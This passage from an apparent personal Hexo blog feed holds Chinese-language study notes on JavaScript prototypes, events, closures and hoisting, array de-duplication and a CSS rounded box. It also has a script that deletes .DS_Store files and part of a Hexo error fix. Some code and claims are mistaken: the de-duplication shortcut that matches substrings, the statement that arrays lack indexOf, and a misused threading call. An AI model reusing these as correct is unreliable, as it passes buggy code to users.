class="line"><span class="attribute">id:</span><span class="string"> 1,</span></span><br><span class="line"><span class="string">__proto__</span>: base</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ext2 = &#123;</span><br><span class="line"><span class="attribute">id:</span><span class="string"> 2,</span></span><br><span class="line"><span class="string">__proto__</span>: base</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://7xs4ih.com1.z0.glb.clouddn.com/JSnote_base.png" alt=""><br>code 2/2:<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Task</span><span class="params">(id)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Task.prototype.status = <span class="string">"stopped"</span>;</span><br><span class="line"></span><br><span class="line">Task.prototype.execute = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.id + <span class="keyword">this</span>.status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> task1 = Task(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">var</span> task2 = Task(<span class="number">2</span>)</span><br><span class="line">task1.status = <span class="string">"active"</span>;</span><br></pre></td></tr></table></figure></p><p><img src="http://7xs4ih.com1.z0.glb.clouddn.com/JSnote_task.png" alt=""></p><hr><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>html如下：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"baba"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"gege"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"wo"</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure></p><p>js：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wo.addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>&#123;</span><br><span class="line">alert(<span class="string">"wo"</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></p><p>这里false是指注册冒泡事件，若为true就是捕获。<br><img src="http://7xs4ih.com1.z0.glb.clouddn.com/JSnote_TF.png" alt=""><br>先捕获后冒泡，先注册先执行。<br><img src="http://7xs4ih.com1.z0.glb.clouddn.com/JSnote_propagation.png" alt=""><br><code>e.stopPropagation()</code>停止冒泡和捕获。<br><img src="http://7xs4ih.com1.z0.glb.clouddn.com/JSnote_stop.png" alt=""><br><code>removeEventListener</code>取消注册需要三个参数均相同。  </p><hr><h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;      嵌套的func</span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;      内部变量</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">alert(++i); 内部func向外传递变量值</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b;       返回内部的func</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> c = a();        实例化外部func</span><br><span class="line">c();</span><br></pre></td></tr></table></figure><p>变量以函数分界，注意不包括<code>for</code><br>没有用var的变量默认为全局变量  </p><h1 id="顺序"><a href="#顺序" class="headerlink" title="顺序"></a>顺序</h1><p>css和image加载时不会终止页面加载，js会等加载完再继续。<br>加载完之后js预编译，优先函数的定义，然后创建<code>var foo = undefined</code>，之后执行，变量才开始在原型链中找值，找不到再到作用域中找。<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">alert(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面由于函数是由构造函数<code>function</code>定义的，所以会先预编译，待执行时<code>f()</code>已经有相应的组成了。<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f()<span class="comment">;</span></span><br><span class="line"><span class="attribute">f</span> = function() &#123;</span><br><span class="line">alert(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里f变量的值由匿名函数来，变量在原型链/作用域中找值要晚于顺序执行，所以这段代码运行时会报错，说f并未定义。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS去重</title>
      <link href="/2016/04-17-getDist/"/>
      <url>/2016/04-17-getDist/</url>
      
        <content type="html"><![CDATA[<p>看了一个题，要求用JS给数组去重。<br>标答的实现时间复杂度比我自己想的版本要多一些，下面记录一下自己的版本。<br><a id="more"></a></p><hr><h1 id="标答的实现"><a href="#标答的实现" class="headerlink" title="标答的实现"></a>标答的实现</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDist</span>(<span class="params">a</span>) </span>&#123;　　</span><br><span class="line">    <span class="keyword">var</span> res = [];　　</span><br><span class="line">    res[<span class="number">0</span>] = a[<span class="number">0</span>];　　</span><br><span class="line">    key = <span class="number">1</span>;　　</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; a.length; i++) &#123;　　</span><br><span class="line">        flag = <span class="literal">false</span>;　　</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; key; j++) &#123;　　</span><br><span class="line">            <span class="keyword">if</span> (a[i] == res[j]) &#123;　　</span><br><span class="line">                flag = <span class="literal">true</span>;　　</span><br><span class="line">                <span class="keyword">break</span>;　　</span><br><span class="line">            &#125;　　</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag === <span class="literal">false</span>) &#123;</span><br><span class="line">            res[key] = a[i];　　</span><br><span class="line">            key++;　　</span><br><span class="line">        &#125;　　</span><br><span class="line">    &#125;　　</span><br><span class="line">    <span class="keyword">return</span> res;　　</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说就是两个遍历，第一个遍历是把原数组中的值拿出来，第二个遍历是把值和返回值中的比较，若不相同就放进去。<br>理解上来还是挺简单的，后来我发现其实不用两次遍历的，里面的遍历其实可以不用for。<br>话说上面这个的时间复杂度我还真不会算了，貌似是O(n^2)，但是中间明显不是n次。<br>应该是大于O(n)，小于O(n^2)，难道是O(nlgn)？  </p><h1 id="我的实现"><a href="#我的实现" class="headerlink" title="我的实现"></a>我的实现</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDist2</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> res = [];</span><br><span class="line">res[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; a.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (res.toString().indexOf(a[i]) === <span class="number">-1</span>) &#123;</span><br><span class="line">res.push(a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始就想找index的，结果发现JS里面数组没有这个函数，字符串才有，于是就有了这个版本。<br>先转换为字符串，再indexOf。<br>好像也没有append函数，只有push。  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>手写Border</title>
      <link href="/2016/04-17-handWriteBorder/"/>
      <url>/2016/04-17-handWriteBorder/</url>
      
        <content type="html"><![CDATA[<p>看了一个题，叫使用纯CSS+HTML方式实现圆角框。<br><a href="http://yjbys.com/bishi/timu/613776.html" target="_blank" rel="noopener">想看题的点这里</a>。<br>题下面有答案，答案说直接margin就可以实现了，我研究了一下代码并没有看懂。<br>题目说是五条线设置不同外边距为5、3、2、1、1即可，但是下面给的答案却有八个不同的div，我并不知道是上下分开设置了还是一个角落就有八个div。<br>然后按照他的逻辑写了一下，但是没有搞成功，先挖个坑在这里，下面贴我成功的代码。  </p><hr><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><p>简单逻辑就是<code>b1</code>外边距负得多，里面的外边距负的少。<br>几个div嵌套起来，分别设置左右边距。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"b1"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"b2"</span>&gt;</span><br><span class="line">        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"b3"</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"b4"</span>&gt;</span><br><span class="line">                &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"b5"</span>&gt;</span><br><span class="line">                    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"b6"</span>&gt;</span><br><span class="line">                        &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"content"</span>&gt;</span><br><span class="line">                            hello world!</span><br><span class="line">                            &lt;br&gt; gaoryrt</span><br><span class="line">                        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">                    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">                &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">            &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">        &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure></p><p>这个用emmet写出来特别简单：<code>.b1&gt;.b2&gt;.b3&gt;.b4&gt;.b5&gt;.b6&gt;.content</code>, 好像子元素不能用<code>$</code>来迭代吧。  </p><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.b1</span>, <span class="selector-class">.b2</span>, <span class="selector-class">.b3</span>, <span class="selector-class">.b4</span>, <span class="selector-class">.b5</span>, <span class="selector-class">.b6</span> &#123;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">8px</span>;</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#F0F8FF</span>;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#F0F8FF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.b1</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.b2</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.b3</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.b4</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.b5</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.b6</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.b1</span><span class="selector-pseudo">:before</span>, <span class="selector-class">.b2</span><span class="selector-pseudo">:before</span>, <span class="selector-class">.b3</span><span class="selector-pseudo">:before</span>, <span class="selector-class">.b4</span><span class="selector-pseudo">:before</span>, <span class="selector-class">.b5</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">"."</span>;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#F0F8FF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.b1</span>, <span class="selector-class">.b1</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.b1</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#98C2F0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.b1</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span> -<span class="number">50px</span>;</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#98C2F0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.b2</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span> -<span class="number">20px</span>;</span><br><span class="line">        <span class="attribute">border-left</span>: <span class="number">20px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">20px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.b3</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span> -<span class="number">30px</span>;</span><br><span class="line">        <span class="attribute">border-left</span>: <span class="number">10px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">10px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.b4</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span> -<span class="number">20px</span>;</span><br><span class="line">        <span class="attribute">border-left</span>: <span class="number">10px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">10px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.b6</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span> -<span class="number">20px</span>;</span><br><span class="line">        <span class="attribute">border-left</span>: <span class="number">10px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">10px</span> solid <span class="number">#98C2F0</span>;</span><br><span class="line">        <span class="attribute">display</span>: flex;</span><br><span class="line">        <span class="attribute">justify-content</span>: center;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.content</span> &#123;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">50px</span>;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">5em</span>;</span><br><span class="line">        <span class="attribute">color</span>: black;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个是纯css，要是用sass肯定更简单。<br>个人项目一是量少，二是懒，一般都不怎么用sass这种css generator。<br>惨了惨了，不会写了。</p><h1 id="效果对比"><a href="#效果对比" class="headerlink" title="效果对比"></a>效果对比</h1><p>题目要求：<br><img src="http://7xs4ih.com1.z0.glb.clouddn.com/3927-14050G10346119.png" alt="题目"><br>我的效果：<br><img src="http://7xs4ih.com1.z0.glb.clouddn.com/myversion.png" alt="我的效果"></p><hr><p>要是有更简单的方法还劳烦提醒一下。<br>以上。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个思考</title>
      <link href="/2016/04-14-delDSStore/"/>
      <url>/2016/04-14-delDSStore/</url>
      
        <content type="html"><![CDATA[<p>原本第一句话是『.DS_store是git的敌人』，我想了一下，还是默默改成了下面这一句。  </p><blockquote><p>DS.store是hexo generate的敌人。</p></blockquote><hr><h1 id="起"><a href="#起" class="headerlink" title="起"></a>起</h1><p>本来还想举例说git使用中<code>.DS_store</code>文件很麻烦，后来想到添加gitignore就可以了。<br><strong>但是</strong><br>我不知道如何向hexo generator中添加忽略文件，所以每一次带有<code>hexo generate</code>的操作都会得到以下错误：<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ERROR </span>Process failed: layout/_partial/.DS_Store</span><br><span class="line">TypeError: Cannot read property 'compile' of undefined</span><br></pre></td></tr></table></figure></p><p>虽然不会影响网页生成，但是总碍眼。</p><hr><h1 id="承"><a href="#承" class="headerlink" title="承"></a>承</h1><p><code>.DS_store</code>本身是为了文章显示而生成的，OSX自带这个东西。<br>删除了会因为finder的访问重新出来，每一次都用相同的<code>rm .DS_store</code>总是不现实的。<br>加之<code>layout/</code>下有几个文件夹，就有几个<code>.DS_store</code>,挨个删除也麻烦。<br>那么可以尝试<code>禁止系统创建</code>：<br>（建议在执行之前看看<a href="https://www.zhihu.com/question/20345704" target="_blank" rel="noopener">知乎上相关的讨论</a>，以及<a href="http://stackoverflow.com/questions/18015978/how-to-stop-creating-ds-store-on-mac" target="_blank" rel="noopener">StackOverflow上相关的讨论</a>）<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com<span class="selector-class">.apple</span><span class="selector-class">.desktopservices</span> DSDontWriteNetworkStores -bool TRUE</span><br></pre></td></tr></table></figure></p><p>下面是恢复：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults delete com<span class="selector-class">.apple</span><span class="selector-class">.desktopservices</span> DSDontWriteNetworkStores</span><br></pre></td></tr></table></figure></p><p>也可以使用如下的命令删除一个文件夹下的所有<code>.DS_Store</code>文件：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> &lt;your path&gt; -name <span class="string">".DS_Store"</span> -<span class="keyword">delete</span></span><br></pre></td></tr></table></figure></p><hr><h1 id="转"><a href="#转" class="headerlink" title="转"></a>转</h1><p>想了想其实可以写一个python脚本来干这个事情。<br>往脚本里添加路径，执行时遍历这几个路径删除所有的<code>.DS_store</code>。<br>然后可以把这个python脚本变成全局命令，这样想删除的时候就只用输入几个字母就行了。<br>比如<code>DDS</code>，也不知道shell命令区分大小写不呢？<br><strong>但是</strong><br>想到每一次<code>hexo s</code>之前都要<code>DDS</code>跑一遍，总是增加了操作成本的。<br>哈哈，可以在<code>.zshrc</code>中添加<code>alias</code>。<br>那么这个<code>DelDS_store.py</code>文件应该怎么写呢？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">pathList = [<span class="string">'/Volumes/HHD/应用/hexo/themes/pln/layout'</span>,</span><br><span class="line">            <span class="string">'/Volumes/HHD/应用/Github/hexo-theme-pln/layout'</span>]</span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> pathList:</span><br><span class="line">    command = <span class="string">'find '</span> + path + <span class="string">' -name ".DS_Store" -delete'</span></span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure></p><p>这个是绝对没有问题的版本，可以自定义路径到<code>pathList</code>当中，执行时全部都给删除完。<br>然后想了一下能不能多线程：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">pathList = [<span class="string">'/Volumes/HHD/应用/hexo/themes/pln/layout'</span>,</span><br><span class="line">            <span class="string">'/Volumes/HHD/应用/Github/hexo-theme-pln/layout'</span>]</span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> pathList:</span><br><span class="line">    command = <span class="string">'find '</span> + path + <span class="string">' -name ".DS_Store" -delete'</span></span><br><span class="line">    threading.Thread(target=os.system(command)).start()</span><br></pre></td></tr></table></figure></p><p>冲哥和奶神都说说线程会自动回收掉，但是我知道有kill的存在。<br>但是看了一下执行完成的flag也是0，这下真不知道如何确认执行完成再正确关闭了。<br>SOF上说不要盲目kill，那就这样了？<br><a href="http://zhuanlan.zhihu.com/p/20167077?refer=auxten" target="_blank" rel="noopener">点击这里查看更多Python线程</a></p><hr><h1 id="结"><a href="#结" class="headerlink" title="结"></a>结</h1><blockquote><p>这里使用的是多线程版本。  </p></blockquote><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>DelDS_store.py</span><br></pre></td></tr></table></figure><p>然后用编辑器打开，无论你是<code>open .</code>之后右键选择打开方式，还是直接<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>DelDS_store.py</span><br></pre></td></tr></table></figure></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>打开之后往这个文件里写入以下内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">pathList = [<span class="string">'/Volumes/HHD/应用/hexo/themes/pln/layout'</span>,</span><br><span class="line">            <span class="string">'/Volumes/HHD/应用/Github/hexo-theme-pln/layout'</span>]</span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> pathList:</span><br><span class="line">    command = <span class="string">'find '</span> + path + <span class="string">' -name ".DS_Store" -delete'</span></span><br><span class="line">    threading.Thread(target=os.system(command)).start()</span><br></pre></td></tr></table></figure></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>为这个文件添加执行权限：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>DelDS_store.py</span><br></pre></td></tr></table></figure></p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>打开你的<code>bashrc</code>/<code>fishrc</code>/<code>zshrc</code>,这个取决于你使用的shell。<br>在里面添加一个别名：<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alias</span> <span class="title">DDS</span>=<span class="string">"/usr/local/bin/DelDS_store.py"</span></span><br></pre></td></tr></table></figure></p><p>或者是，直接添加一行：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>DelDS_store.py</span><br></pre></td></tr></table></figure></p><p>这样做的后果就是，每一次新建shell都会执行一遍删除命令。</p><h2 id="完成！"><a href="#完成！" class="headerlink" title="完成！"></a>完成！</h2><p>这样就可以使用shell，在任何地方通过<code>DDS</code>这个命令来删除指定文件夹下的<code>.DS_Store</code>文件了。</p><hr><p>以上。</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>解决Hexo MODULE NOT FOUND问题</title>
      <link href="/2016/04-11-MODULE-NOT-FOUND/"/>
      <url>/2016/04-11-MODULE-NOT-FOUND/</url>
      
        <content type="html"><![CDATA[<p>看见其他地方是其他的方法，我这里还是记录下来，万一别人也遇见了呢。</p><hr><h1 id="问题-PROBLEM"><a href="#问题-PROBLEM" class="headerlink" title="问题 PROBLEM"></a>问题 PROBLEM</h1><p>在使用hexo的时候会遇见以下问题<br>every time i run <code>hexo</code> command, i encounter following problems   </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/Release/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/default/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/Debug/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="分析-ANALYZATION"><a href="#分析-ANALYZATION" class="headerlink" title="分析 ANALYZATION"></a>分析 ANALYZATION</h1><p>Stackoverflow上查了一下，人家说，<code>npm install hexo --no-optional</code>就可以解决了。<br>after stackoverflowing it, i got the solution <code>npm install hexo --no-optional</code>.</p><p>但是我并不需要重新安装整个hexo模块，毕竟依赖很多，而且重新下载时若网络环境不好，又会产生同样的错误，所以我需要用更简单的解决方法。<br>As the hexo module have numerous dependencies, and rebuild it under an unstable network-environment would give rise to the same problem, there’s no need to reinstall the whole module.</p><p>在hexo目录下通过关键字<code>DTraceProviderBindings</code>找了一下，发现了这个模块。<br>i found this module after seaching <code>DTraceProviderBindings</code> in hexo’s folder.<br><a href="mailto:`dtrace-provider@0.6.0" target="_blank" rel="noopener">`dtrace-provider@0.6.0</a> node_modules/dtrace-provider`这个模块用于调试时提供更高级的信息，可以在<a href="https://github.com/chrisa/node-dtrace-provider" target="_blank" rel="noopener">其页面</a>查看更多信息。<br>this extension allows you to create native DTrace providers for your Node.js applications. That is, to create providers and probes which expose information specific to your application, rather than information about the node runtime. read more on <a href="https://github.com/chrisa/node-dtrace-provider" target="_blank" rel="noopener">it’s github page</a>.</p><hr><h1 id="解决-SOLUTION"><a href="#解决-SOLUTION" class="headerlink" title="解决 SOLUTION"></a>解决 